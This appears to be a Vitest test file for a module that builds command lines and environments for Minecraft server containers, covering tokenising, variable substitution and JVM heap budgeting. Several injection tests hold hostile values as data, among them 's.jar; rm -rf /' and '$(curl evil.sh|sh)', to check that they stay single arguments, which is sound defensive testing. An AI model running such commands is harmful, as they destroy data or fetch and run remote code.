import { describe, expect, it } from 'vitest';
import {
  InvocationError,
  MAX_HEAP_RATIO,
  buildEnvironment,
  buildInvocation,
  heapBudgetMib,
  substitute,
  tokenize,
} from './invocation.js';

const CONTEXT = {
  environment: { SERVER_JARFILE: 'server.jar', MINECRAFT_VERSION: '1.21.4' },
  memoryMib: 4096,
  ip: '0.0.0.0',
  port: 25565,
};

describe('tokenize', () => {
  it('splits on spaces', () => {
    expect(tokenize('java -Xmx1024M -jar server.jar')).toEqual([
      'java',
      '-Xmx1024M',
      '-jar',
      'server.jar',
    ]);
  });

  it('honours double quotes', () => {
    expect(tokenize('java -Dname="My Server" -jar s.jar')).toEqual([
      'java',
      '-Dname=My Server',
      '-jar',
      's.jar',
    ]);
  });

  it('honours single quotes', () => {
    expect(tokenize("java -Dmsg='a b c'")).toEqual(['java', '-Dmsg=a b c']);
  });

  it('ignores repeated spaces and tabs', () => {
    expect(tokenize('java   -jar\t\ts.jar')).toEqual(['java', '-jar', 's.jar']);
  });

  it('keeps an explicitly empty argument', () => {
    expect(tokenize('java -Dx=""')).toEqual(['java', '-Dx=']);
  });

  it('rejects an unclosed quote', () => {
    expect(() => tokenize('java -Dname="oops')).toThrow(InvocationError);
  });

  it('returns an empty array for an empty string', () => {
    expect(tokenize('   ')).toEqual([]);
  });
});

describe('substitute', () => {
  it('replaces known variables', () => {
    expect(substitute('-jar {{SERVER_JARFILE}}', CONTEXT).value).toBe('-jar server.jar');
  });

  it('tolerates spaces inside the braces', () => {
    expect(substitute('{{ SERVER_PORT }}', CONTEXT).value).toBe('25565');
  });

  it('provides the built-in variables', () => {
    // A 4096 MiB container → a 3276 MiB heap (80%), the rest left to the JVM's
    // off-heap and to the page cache.
    expect(substitute('-Xmx{{SERVER_MEMORY}}M', CONTEXT).value).toBe('-Xmx3276M');
    expect(substitute('{{SERVER_IP}}:{{SERVER_PORT}}', CONTEXT).value).toBe('0.0.0.0:25565');
  });

  it('also exposes the raw container limit', () => {
    expect(substitute('{{SERVER_MEMORY_LIMIT}}', CONTEXT).value).toBe('4096');
  });

  it('accepts the dotted notation of Pterodactyl eggs', () => {
    expect(substitute('{{server.build.default.port}}', CONTEXT).value).toBe('25565');
  });

  it('reports an unknown variable and replaces it with nothing', () => {
    const result = substitute('{{UNKNOWN}}-suffix', CONTEXT);
    expect(result.value).toBe('-suffix');
    expect(result.missing).toEqual(['UNKNOWN']);
  });

  // A template must not be able to redirect the listening port announced to
  // players by redefining the variable.
  it('does not let the template overwrite a built-in variable', () => {
    const context = { ...CONTEXT, environment: { SERVER_PORT: '1337' } };
    expect(substitute('{{SERVER_PORT}}', context).value).toBe('25565');
  });
});

/**
 * This block exists because of a server killed by the kernel on the test
 * machine, then fixed twice — both mistakes are worth remembering.
 *
 * First, the JVM was launched with `-Xmx` equal to the container limit: the
 * heap alone could fill the cgroup.
 *
 * Then, the 256 MiB headroom covered the JVM's off-heap but forgot the page
 * cache, which counts towards the cgroup too. With measurements: a 1024 MiB
 * container, `-Xmx768M`, anonymous memory climbing to 1018 MiB, cache crushed
 * from 127 MiB to 0, then code 137 — after a start that had fully completed.
 */
describe('heapBudgetMib', () => {
  // Two rules combine, and the stricter wins: a fixed 384 MiB headroom, and an
  // 80% ceiling. The switch happens at 1920 MiB.
  it.each([
    [512, 128],
    [1024, 640],
    [1536, 1152],
  ])('subtracts the fixed headroom on %s MiB', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  it.each([
    [2048, 1638],
    [4096, 3276],
    [8192, 6553],
  ])('applies the 80%% ceiling on %s MiB', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  // This is the property that matters, more than the exact values: the heap
  // must never be able to fill the container on its own.
  it.each([256, 512, 1024, 2048, 4096, 8192, 16384, 65536])(
    'leaves at least 20%% of headroom on %s MiB',
    (limit) => {
      const heap = heapBudgetMib(limit);
      expect(heap).toBeLessThanOrEqual(Math.floor(limit * MAX_HEAP_RATIO));
    },
  );

  // The measurement that motivated the fix: at 1024 MiB, the anonymous off-heap
  // alone weighs ~250 MiB. Enough has to be left to cache the region files,
  // failing which the kernel evicts everything then kills the process.
  it('leaves room for the page cache on a small allocation', () => {
    const NON_HEAP_ANON_MIB = 250;
    const heap = heapBudgetMib(1024);

    expect(1024 - heap - NON_HEAP_ANON_MIB).toBeGreaterThanOrEqual(128);
  });

  it('never goes below the JVM startup floor', () => {
    expect(heapBudgetMib(128)).toBe(128);
    expect(heapBudgetMib(64)).toBe(128);
  });

  // With no container limit there is nothing to share out: it is up to the
  // template not to use `-Xmx` in that case.
  it('returns 0 for unlimited memory', () => {
    expect(heapBudgetMib(0)).toBe(0);
  });
});

describe('buildInvocation', () => {
  it('produces a usable argv', () => {
    const { argv } = buildInvocation(
      'java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}}',
      CONTEXT,
    );

    expect(argv).toEqual(['java', '-Xms128M', '-Xmx3276M', '-jar', 'server.jar']);
  });

  // ---------------------------------------------------------------------------
  // These cases are the reason the module exists: they fail if the split /
  // substitute order is ever reversed.
  // ---------------------------------------------------------------------------

  it('stops a variable value from introducing an argument', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 'a.jar --hostile-flag' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 'a.jar --hostile-flag']);
    expect(argv).toHaveLength(3);
  });

  it('stops command injection through a semicolon', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar; rm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 's.jar; rm -rf /']);
  });

  it('stops injection through command substitution', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: '$(curl evil.sh|sh)' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv[2]).toBe('$(curl evil.sh|sh)');
    expect(argv).toHaveLength(3);
  });

  it('stops injection through a newline', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar\nrm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toHaveLength(3);
    expect(argv[2]).toBe('s.jar\nrm -rf /');
  });

  it('stops a value from closing a quote of the template', () => {
    const context = { ...CONTEXT, environment: { NAME: 'x" --hostile "y' } };
    const { argv } = buildInvocation('java -Dname="{{NAME}}"', context);

    expect(argv).toEqual(['java', '-Dname=x" --hostile "y']);
  });

  // ---------------------------------------------------------------------------

  it('drops an argument that became entirely empty', () => {
    const context = { ...CONTEXT, environment: {} };
    const { argv, missingVariables } = buildInvocation('java {{MISSING}} -jar s.jar', context);

    expect(argv).toEqual(['java', '-jar', 's.jar']);
    expect(missingVariables).toEqual(['MISSING']);
  });

  it('rejects an empty template', () => {
    expect(() => buildInvocation('   ', CONTEXT)).toThrow(/empty/);
  });

  it('rejects a template whose executable disappears after substitution', () => {
    expect(() => buildInvocation('{{MISSING}}', { ...CONTEXT, environment: {} })).toThrow(
      /no executable/,
    );
  });

  it('reports each missing variable only once', () => {
    const { missingVariables } = buildInvocation('java {{X}} {{X}} {{Y}} -jar s.jar', {
      ...CONTEXT,
      environment: {},
    });

    expect(missingVariables.sort()).toEqual(['X', 'Y']);
  });
});

describe('buildEnvironment', () => {
  it('exposes the template variables and the built-in ones', () => {
    const env = buildEnvironment(CONTEXT);

    expect(env).toContain('SERVER_JARFILE=server.jar');
    expect(env).toContain('MINECRAFT_VERSION=1.21.4');
    expect(env).toContain('SERVER_MEMORY=3276');
    expect(env).toContain('SERVER_PORT=25565');
  });

  it('drops names that are invalid in POSIX', () => {
    const env = buildEnvironment(CONTEXT);
    expect(env.some((entry) => entry.startsWith('server.build'))).toBe(false);
  });

  it('does not let the template redefine a built-in variable', () => {
    const env = buildEnvironment({ ...CONTEXT, environment: { SERVER_PORT: '1337' } });

    expect(env).toContain('SERVER_PORT=25565');
    expect(env).not.toContain('SERVER_PORT=1337');
  });
});
